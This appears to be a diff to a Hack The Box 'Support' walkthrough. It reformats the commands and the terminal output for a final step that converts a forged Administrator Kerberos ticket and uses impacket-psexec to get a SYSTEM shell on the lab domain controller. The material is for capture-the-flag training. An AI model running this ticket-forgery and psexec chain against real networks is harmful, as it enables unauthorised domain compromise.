@@ -1525,7 +1525,9 @@ The forged `Administrator` ticket is in `.kirbi` format; converting it to Im
 **Command:**
 
 ```
-cat ticket.kirbi.b64 | tr -d '[:space:]' | base64 -d > ticket.kirbiimpacket-ticketConverter ticket.kirbi ticket.ccacheKRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
+cat ticket.kirbi.b64 | tr -d '[:space:]' | base64 -d > ticket.kirbi
+impacket-ticketConverter ticket.kirbi ticket.ccache
+KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
 ```
 
 **Breakdown:**
@@ -1546,10 +1548,32 @@ cat ticket.kirbi.b64 | tr -d '[:space:]' | base64 -d > ticket.kirbiimpacket-tick
 **Result:**
 
 ```
-[*] Found writable share ADMIN$[*] Uploading file PpITEHDH.exe[*] Creating service ySkE on dc.support.htb.....[*] Starting service ySkE.....Microsoft Windows [Version 10.0.20348.859]C:\Windows\system32>
+┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
+└─$ cat ticket.kirbi.b64 | tr -d '[:space:]' | base64 -d > ticket.kirbi
+impacket-ticketConverter ticket.kirbi ticket.ccache
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] converting kirbi to ccache...
+[+] done
+
+┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
+└─$ KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on dc.support.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file PpITEHDH.exe
+[*] Opening SVCManager on dc.support.htb.....
+[*] Creating service ySkE on dc.support.htb.....
+[*] Starting service ySkE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.859]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> 
 ```
 
-_What this gives you:_ **Key finding:** an interactive shell on the Domain Controller as `NT AUTHORITY\SYSTEM` — full compromise of the domain.
+**Key finding:** an interactive shell on the Domain Controller as `NT AUTHORITY\SYSTEM` — full compromise of the domain.
 
 _Next:_ Capture the root flag to complete the engagement.
 <div align="center">
